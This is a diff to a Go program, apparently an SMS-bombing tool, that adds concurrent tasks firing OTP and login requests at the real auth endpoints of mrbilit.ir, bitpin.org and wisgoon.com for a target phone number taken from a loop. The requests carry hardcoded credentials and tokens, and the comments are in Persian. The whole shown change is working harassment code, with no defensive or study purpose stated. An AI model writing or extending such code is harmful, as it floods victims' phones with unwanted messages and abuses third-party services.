@@ -351,7 +351,41 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
+		// mrbilit.ir (OTP - GET)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { // capture client
+			return func() {
+				// در GET، پارامتر به URL اضافه می شود
+				urlWithParam := fmt.Sprintf("https://auth.mrbilit.ir/api/Token/send?mobile=%s", phone) // phone از حلقه اصلی capture می شود
+				sendGETRequest(c, ctx, urlWithParam, &wg, ch)
+			}
+		}(client) // capture client
 
+		// bitpin.org (Authenticate - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { // capture client
+			return func() {
+				payload := map[string]interface{}{
+					"device_type": "web",
+					"password":    "guhguihifgov3",
+					"phone":       phone, // phone از حلقه اصلی capture می شود
+				}
+				sendJSONRequest(c, ctx, "https://api.bitpin.org/v3/usr/authenticate/", payload, &wg, ch)
+			}
+		}(client) // capture client
+
+		// wisgoon.com (Login - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { // capture client
+			return func() {
+				payload := map[string]interface{}{
+					"phone":              phone, // phone از حلقه اصلی capture می شود
+					"token":              "e622c330c77a17c8426e638d7a85da6c2ec9f455AbCode",
+					"recaptcha-response": "03AFc...",
+				}
+				sendJSONRequest(c, ctx, "https://gateway.wisgoon.com/api/v1/auth/login/", payload, &wg, ch)
+			}
+		}(client) // capture client
 		// balad.ir - POST JSON
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
